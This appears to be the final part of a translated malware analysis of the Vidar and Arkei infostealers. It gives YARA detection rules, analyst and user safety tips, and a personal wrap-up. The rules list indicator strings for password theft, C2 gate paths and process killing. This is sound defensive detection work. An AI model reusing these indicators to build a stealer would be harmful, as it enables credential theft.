rule AntiVidar : Vidar 
`{`
    meta:
        description = "Yara rule for detecting Anti Vidar - Vidar Cracked Version"
        author = "Fumik0_"

    strings:
        $mz = `{` 4D 5A `}`
        $s1 = `{` 56 69 64 61 72 `}`
        $hx1 = `{` 56 00 69 00 64 00 61 00 72 00 2E 00 63 00 70 00 70 00 `}`
        $hx2 = `{` 78 61 6B 66 6F 72 2E 6E  65 74 00 `}`
    condition:
         $mz at 0 and all of ($hx*) and not $s1
`}`
```

**Arkei**

```
rule Arkei : Arkei
rule Arkei : Arkei
`{`
     meta:
          Author = "Fumik0_"
          Description = "Rule to detect Arkei"
          Date = "2018/12/11"

      strings:
          $mz = `{` 4D 5A `}`

          $s1 = "Arkei" wide ascii
          $s2 = "/server/gate" wide ascii
          $s3 = "/server/grubConfig" wide ascii
          $s4 = "\files\" wide ascii
          $s5 = "SQLite" wide ascii

          $x1 = "/c taskkill /im" wide ascii
          $x2 = "screenshot.jpg" wide ascii
          $x3 = "files\passwords.txt" wide ascii
          $x4 = "http://ip-api.com/line/" wide ascii
          $x5 = "[Hardware]" wide ascii
          $x6 = "[Network]" wide ascii
          $x7 = "[Processes]" wide ascii

          $hx1 = `{` 56 00 69 00 64 00 61 00 72 00 2E 00 63 00 70 00 70 00 `}`


     condition:
          $mz at 0 and
          ( (all of ($s*)) or ((all of ($x*)) and not $hx1))
`}`

```



## GitHub
- [检测脚本](https://github.com/Fmk0/scripts/blob/master/izanami.py)
- [配置信息](https://github.com/Fmk0/work/tree/master/Vidar)


## 建议

和我以前的博文中提到的一样，需要注意：
- 始终在虚拟机中运行恶意软件，并在虚拟机中安装增强功能（如Guest Additions）来触发尽可能多的虚拟机检测，然后关闭恶意软件。
- 完成检测后，停止虚拟机并还原到纯净的快照。
- 避免将文件存储在预先指定的路径（如Desktop, Documents, Downloads）中，而是放在不常见的位置。
- 不要愚蠢的去点击youtube上那些教你破解热门游戏或快速赚钱的弹框。（像Free Bitcoin Program /facepalm）
- 关闭浏览器前记得清除历史记录，不要使用“记住密码”。
- 不要使用同一密码注册多个网站。尽可能使用2FA 。


## 结语

这次分析经历对我而言就像一场探秘游戏。虽然很难去判断Vidar是否为Arkei的升级版，还是基于Arkei代码进行了二次开发。但就目前而言，正因为它是一款新的恶意软件，非常活跃，不断推出新的版本，所以我们可以保持持续跟踪。另一方面，它又和Android Lokibot使用了一样的皮肤主题（破解版），但由于没有相关样本，导致缺失一些用来找到真正C2的关键信息。现在，让我们跟随着时间，看是否能得到更多线索来得到答案。

对于我个人，总结一下。我做了比预想中更多的事，2018是真正思考的一年，曾面对了许多问题和考验。我准备好迎接新一年的挑战了。今年经常因为学习而废寝忘食，现在是时候休息一下了。

感谢我们的小伙伴们，你们是最棒的！
